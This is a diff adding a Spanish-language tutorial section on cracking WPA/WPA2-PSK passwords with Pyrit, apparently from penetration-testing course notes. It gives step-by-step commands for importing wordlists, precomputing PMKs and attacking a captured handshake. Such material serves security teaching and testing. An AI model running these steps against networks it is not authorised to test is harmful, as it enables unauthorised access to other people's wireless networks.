@@ -972,6 +972,44 @@ Para WPA/WPA2-PSK, el uso de Rainbow Tables es más complejo debido al "salting"
 
 Debido a esta limitación, las Rainbow Tables no son la técnica principal para el cracking de WPA/WPA2-PSK. En su lugar, se prefieren los ataques de diccionario o fuerza bruta "on-the-fly" (calculando el hash en tiempo real) utilizando herramientas optimizadas para GPU como Hashcat, o herramientas que precalculan PMKs para un conjunto limitado de SSIDs y contraseñas (como Pyrit).
 
+## 32. Cracking con Pyrit
+
+Pyrit es una herramienta avanzada para el cracking de contraseñas WPA/WPA2-PSK que aprovecha la potencia de procesamiento de CPUs multi-núcleo y GPUs para acelerar significativamente el proceso de ataque.
+
+### Fundamento técnico:
+- Pyrit explota la debilidad fundamental de WPA/WPA2-PSK: el uso del SSID como "sal" (salt) en la derivación de claves
+- Permite precomputar las Pairwise Master Keys (PMKs) para un SSID específico, creando bases de datos que aceleran ataques posteriores
+
+### Procedimiento
+```bash
+pyrit -r [Captura_Handshake] analyze
+pyrit -r [Captura_Handshake] -e [Nombre_AP] -i [Diccionario] attack_passthrough
+```
+### Procedimiento detallado: 
+1. Importar un diccionario de contraseñas a la base de datos de Pyrit:
+   ```bash
+   pyrit -i diccionario.txt import_passwords
+   ```
+
+2. Crear un ESSID en la base de datos:
+   ```bash
+   pyrit -e "NombreDeRed" create_essid
+   ```
+
+3. Realizar el procesamiento por lotes para generar las PMKs:
+   ```bash
+   pyrit batch
+   ```
+
+4. Atacar un handshake capturado:
+   ```bash
+   pyrit -r captura.cap -b 00:11:22:33:44:55 attack_db
+   ```
+
+
+
+
+
 ## 37. Cracking con Pyrit frente a una Rainbow Table
 
 Este video demuestra cómo utilizar Pyrit con bases de datos precomputadas (similar a rainbow tables) para realizar ataques extremadamente rápidos contra redes WPA/WPA2-PSK.
